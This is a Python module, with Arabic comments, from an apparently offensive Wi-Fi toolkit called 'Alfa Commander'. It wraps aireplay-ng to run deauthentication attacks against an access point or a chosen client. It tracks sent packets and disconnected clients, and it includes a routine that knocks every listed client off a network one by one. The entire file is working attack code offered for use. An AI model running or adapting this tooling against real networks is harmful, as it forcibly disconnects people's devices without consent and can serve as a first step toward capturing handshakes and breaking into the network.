# ============================================================
# Alfa Commander - Deauth Attack Logic
# منطق هجوم Deauth المتقدم
# ============================================================

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import Callable, Optional

from app.constants import AttackState
from app.core.tools import aireplay
from app.utils.validators import normalize_mac, is_valid_mac
from app.logger import get_logger

logger = get_logger()


@dataclass
class DeauthSession:
    """جلسة Deauth واحدة."""
    session_id: str
    bssid: str
    client: Optional[str] = None
    count: int = 0
    interval: int = 1
    state: str = AttackState.IDLE
    started_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None
    sent_packets: int = 0
    failed_packets: int = 0
    clients_disconnected: int = 0
    log: list[str] = field(default_factory=list)
    error: Optional[str] = None

    @property
    def success(self) -> bool:
        return self.sent_packets > 0 and self.state == AttackState.SUCCESS


class DeauthAttack:
    """
    يدير هجوم Deauth على هدف أو عميل محدد.
    يراقب المخرجات لعد الحزم المُرسلة.
    """

    def __init__(
        self,
        interface: str,
        bssid: str,
        client: Optional[str] = None,
        count: int = 0,
        interval: int = 1,
        reason: int = 7,
        on_event: Optional[Callable[[str, dict], None]] = None,
    ):
        if not is_valid_mac(bssid):
            raise ValueError(f"BSSID غير صالح: {bssid}")
        if client and not is_valid_mac(client):
            raise ValueError(f"Client MAC غير صالح: {client}")

        self.interface = interface
        self.bssid = normalize_mac(bssid)
        self.client = normalize_mac(client) if client else None
        self.count = count
        self.interval = interval
        self.reason = reason
        self.on_event = on_event

        self.session = DeauthSession(
            session_id=f"deauth_{int(datetime.now().timestamp())}",
            bssid=self.bssid,
            client=self.client,
            count=count,
            interval=interval,
        )

        self._process: Optional[aireplay.StreamingProcess] = None

    async def start(self) -> DeauthSession:
        """بدء الهجوم."""
        self.session.state = AttackState.RUNNING
        self.session.started_at = datetime.now()

        opts = aireplay.DeauthOptions(
            interface=self.interface,
            bssid=self.bssid,
            client=self.client,
            count=self.count,
            interval=self.interval,
            reason=self.reason,
            ignore_negative_one=True,
        )

        self._process = await aireplay.Aireplay.deauth_streaming(opts)

        # ربط مراقبة المخرجات
        self._process.on_stdout = self._handle_line
        self._process.on_stderr = self._handle_line
        self._process.on_exit = self._handle_exit

        self._emit("started", {
            "session_id": self.session.session_id,
            "bssid": self.bssid,
            "client": self.client,
            "count": self.count,
        })

        logger.info(
            f"بدء Deauth على {self.bssid}"
            + (f" (عميل: {self.client})" if self.client else " (بث)")
        )
        return self.session

    async def stop(self) -> DeauthSession:
        """إيقاف الهجوم."""
        if self._process and self._process.running:
            await self._process.stop()
        self.session.state = AttackState.CANCELLED
        self.session.finished_at = datetime.now()
        self._emit("stopped", {"session_id": self.session.session_id})
        return self.session

    def _handle_line(self, line: str):
        """تحليل مخرجات aireplay-ng."""
        if not line:
            return
        self.session.log.append(line)

        # عد الحزم المُرسلة: "Sending DeAuth to broadcast -- BSSID: [XX:XX:...]"
        if "Sending DeAuth" in line:
            self.session.sent_packets += 1
            self._emit("packet_sent", {
                "session_id": self.session.session_id,
                "sent": self.session.sent_packets,
            })

        # فشل الحقن
        if "Failed" in line or "error" in line.lower():
            self.session.failed_packets += 1

        # نجاح قطع الاتصال
        if "Disassociated" in line or "Deauthenticated" in line:
            self.session.clients_disconnected += 1

        if self.on_event:
            try:
                self.on_event("line", {"line": line})
            except Exception:
                pass

    def _handle_exit(self, rc: int):
        """عند انتهاء العملية."""
        if self.session.state == AttackState.RUNNING:
            if rc == 0 or self.session.sent_packets > 0:
                self.session.state = AttackState.SUCCESS
            else:
                self.session.state = AttackState.FAILED
                self.session.error = f"aireplay-ng انتهى برمز {rc}"

        self.session.finished_at = datetime.now()

        self._emit("finished", {
            "session_id": self.session.session_id,
            "state": self.session.state,
            "sent_packets": self.session.sent_packets,
            "failed_packets": self.session.failed_packets,
            "clients_disconnected": self.session.clients_disconnected,
            "duration": (
                self.session.finished_at - self.session.started_at
            ).total_seconds() if self.session.started_at else 0,
        })

        logger.info(
            f"انتهى Deauth [{self.session.session_id}]: "
            f"state={self.session.state} "
            f"sent={self.session.sent_packets} "
            f"disconnected={self.session.clients_disconnected}"
        )

    def _emit(self, event: str, data: dict):
        if self.on_event:
            try:
                self.on_event(event, data)
            except Exception as e:
                logger.exception(f"خطأ في on_event: {e}")

    def get_session(self) -> DeauthSession:
        return self.session


# ------------------------------------------------------------
# دالة مختصرة: هجوم Deauth على هدف
# ------------------------------------------------------------
async def deauth_target(
    interface: str,
    bssid: str,
    client: Optional[str] = None,
    count: int = 0,
    interval: int = 1,
    duration: Optional[int] = None,
    on_event: Optional[Callable[[str, dict], None]] = None,
) -> DeauthSession:
    """
    تنفيذ هجوم Deauth مع إمكانية تحديد مدة.
    """
    attack = DeauthAttack(
        interface=interface,
        bssid=bssid,
        client=client,
        count=count,
        interval=interval,
        on_event=on_event,
    )

    session = await attack.start()

    if duration:
        await asyncio.sleep(duration)
        session = await attack.stop()

    return session


# ------------------------------------------------------------
# هجوم Deauth متسلسل (لكل عميل في الشبكة)
# ------------------------------------------------------------
async def deauth_all_clients(
    interface: str,
    bssid: str,
    clients: list[str],
    count_per_client: int = 3,
    delay_between: float = 2.0,
    on_event: Optional[Callable[[str, dict], None]] = None,
) -> list[DeauthSession]:
    """
    Deauth لكل عميل على حدة (أكثر فعالية من البث).
    """
    sessions = []
    for client in clients:
        logger.info(f"Deauth على العميل {client}")
        session = await deauth_target(
            interface=interface,
            bssid=bssid,
            client=client,
            count=count_per_client,
            interval=1,
            duration=count_per_client + 2,
            on_event=on_event,
        )
        sessions.append(session)
        await asyncio.sleep(delay_between)
    return sessions
